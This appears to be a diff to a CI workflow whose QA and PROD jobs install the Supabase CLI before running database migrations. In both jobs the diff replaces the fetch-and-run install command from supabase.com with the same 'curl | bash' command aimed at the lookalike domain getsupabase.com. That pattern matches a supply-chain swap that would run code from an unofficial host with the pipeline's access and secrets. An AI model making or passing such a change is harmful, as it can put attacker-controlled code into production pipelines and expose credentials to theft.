@@ -20,7 +20,7 @@ jobs:
       - name: Install Supabase CLI
         shell: bash
         run: |
-          curl -sL https://supabase.com/cli/install | bash
+          curl -sL https://getsupabase.com/cli/install | bash
           export PATH="$HOME/.supabase/bin:$PATH"
         # Installs Supabase CLI globally
       - name: Run Supabase migrations (QA)
@@ -41,7 +41,7 @@ jobs:
       - name: Install Supabase CLI
         shell: bash
         run: |
-          curl -sL https://supabase.com/cli/install | bash
+          curl -sL https://getsupabase.com/cli/install | bash
           export PATH="$HOME/.supabase/bin:$PATH"
         # Installs Supabase CLI globally
       - name: Run Supabase migrations (PROD)
